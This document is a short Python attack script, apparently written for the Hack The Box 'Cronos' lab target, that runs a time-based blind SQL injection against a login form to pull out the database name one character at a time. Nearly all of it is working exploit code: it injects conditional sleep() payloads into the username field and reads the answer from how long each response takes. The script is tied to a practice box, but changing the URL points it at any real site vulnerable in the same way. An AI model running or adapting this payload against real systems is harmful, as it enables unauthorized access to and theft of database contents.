#BLIND FIRST STEP -> DATABASE
#!/usr/bin/python3

import requests, time, string, pdb, signal
from pwn import *

def def_handler(signal, frame):
        log.failure("Exiting")
        sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Global variables
login_url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'} # if we use Burp
characters = string.ascii_lowercase
s = r'0123456789abcdefghijklmnopqrstuvwxyz_-'
result = ''
# In case we need headers, this is the way
#content = requests.post(url, data=data_post, headers={"Cookie":"JSESSIONID=A903116DE69324E6B286755BF9CE15EE"}) 

def makeRequest():

	p1 = log.progress("SQLi")
	p1.status("Starting bruteforce attack")

	p2 = log.progress("Database")

	time.sleep(2)

	database = ""
	
	for position in range(1, 10):
		for character in characters:

			post_data = {
				'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
				'password': 'admin'
			}

			p1.status(post_data['username'])

			time_start = time.time()
			r = requests.post(login_url, data=post_data)
			time_end = time.time()

			if time_end - time_start > 5:
				database += character
				p2.status(database)
				break

if __name__ == '__main__':

	makeRequest()
